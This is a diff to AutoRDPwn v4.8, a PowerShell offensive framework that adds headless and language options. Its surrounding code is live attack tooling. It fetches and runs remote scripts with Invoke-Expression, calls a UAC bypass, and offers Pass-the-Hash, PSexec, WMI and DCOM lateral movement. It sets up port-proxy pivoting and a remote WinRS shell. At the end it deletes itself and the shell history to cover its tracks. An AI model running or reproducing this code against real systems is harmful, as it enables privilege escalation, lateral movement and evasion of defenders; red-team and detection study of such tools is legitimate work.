@@ -1,11 +1,12 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
+$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] 
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1')
-$noadmin=$args[0] ; if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }}
+if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }}
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 $Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.8 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Disable-Close.ps1')
 
-function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
+function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
      Write-Host
      Write-Host "    ___          __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "_________ _________ ________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
      Write-Host "  /  _  \  __ __|  |_ ___ " -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \_______  \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ___ ___  " -ForegroundColor Green
@@ -17,9 +18,9 @@ function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
      Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v4.8" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
-     Write-Host }
+     Write-Host }}
 
-function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'
+function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - English" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Spanish" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - French" -ForegroundColor Gray
@@ -29,9 +30,9 @@ function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Portuguese" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Help" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
-     Write-Host }
+     Write-Host }}
 
-function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'
+function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - PSexec" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Pass the Hash" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Management Instrumentation" -ForegroundColor Gray
@@ -41,9 +42,9 @@ function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - DCOM Passwordless Execution" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-     Write-Host }
+     Write-Host }}
 
-function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'
+function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt17" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt50" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Networking / Pivoting" -ForegroundColor Gray
@@ -53,7 +54,7 @@ function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt62" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-     Write-Host }
+     Write-Host }}
 
 function ConvertFrom-SecureToPlain {
     param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
@@ -76,24 +77,24 @@ function Remove-Exclusions {
     $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
     Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null } 
 
-    do { Show-Banner ; Show-Language
+    if($nogui -like '-nogui') { $null } else { do { Show-Banner ; Show-Language
     $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; $help = "The detailed guide of use can be found at the following link:"
     $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()
     switch ($input) {
-       '1' { $Language = 'English' }
-       '2' { $Language = 'Spanish' }
-       '3' { $Language = 'French' }
-       '4' { $Language = 'German' }
-       '5' { $Language = 'Italian' }
-       '6' { $Language = 'Russian' }
-       '7' { $Language = 'Portuguese' }
+       '1' { $language = 'English' }
+       '2' { $language = 'Spanish' }
+       '3' { $language = 'French' }
+       '4' { $language = 'German' }
+       '5' { $language = 'Italian' }
+       '6' { $language = 'Russian' }
+       '7' { $language = 'Portuguese' }
        'H' { Write-Host ; Write-Host $help -ForegroundColor Green ; Write-Host ; Write-Host 'https://darkbyte.net/autordpwn-la-guia-definitiva' -ForegroundColor Blue ; sleep -milliseconds 7500 }
        'X' { continue }
-    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X') if($input -in '1','2'){    
+    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X')} ; if($lang -like '-lang') { $language=$args[3] }
 
-    if($Language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/English.ps1') }
-    if($Language -in 'Spanish') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Spanish.ps1') }
+    if($language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/English.ps1') }
+    if($language -in 'Spanish') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Spanish.ps1') }
 
     $Powershell = $host.version ; Write-Host ; if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
     Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
@@ -512,5 +513,5 @@ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubu
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
-else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }} if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }}
+else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 } if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }}
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null
